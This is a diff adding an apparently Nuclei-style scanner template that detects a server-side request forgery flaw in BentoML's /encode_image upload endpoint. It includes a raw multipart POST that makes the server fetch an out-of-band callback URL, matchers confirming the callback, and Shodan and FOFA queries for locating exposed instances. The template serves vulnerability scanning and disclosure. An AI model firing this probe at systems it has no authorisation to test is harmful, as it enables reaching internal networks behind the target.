@@ -1,0 +1,43 @@
+id: bentoml-ssrf
+
+info:
+  name: Bentoml - Server Side Request Forgery
+  author: ritikchaddha
+  severity: critical
+  description: |
+    BentoML's upload file request is vulnerable to SSRF that allowing attacker to access internal service (local network).
+  reference:
+    - https://huntr.com/bounties/901ae5bd-5e24-4f1f-be9f-aa03fa6e1316
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-918
+  metadata:
+    max-request: 1
+    vendor: bentoml
+    product: bentoml
+    shodan-query: html:"BentoML"
+    fofa-query: body="BentoML"
+  tags: ssrf,bentoml,oast
+
+http:
+  - raw:
+      - |
+        POST /encode_image HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqThdiCjrkRXHqIr
+
+        ------WebKitFormBoundaryGqThdiCjrkRXHqIr
+        Content-Disposition: form-data; name="items"; 
+
+        http://{{interactsh-url}}/testing
+        ------WebKitFormBoundaryGqThdiCjrkRXHqIr--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type, "application/json")'
+          - "contains(interactsh_protocol,'http')"
+          - 'contains(body, "error\":")'
+          - 'status_code == 500'
+        condition: and
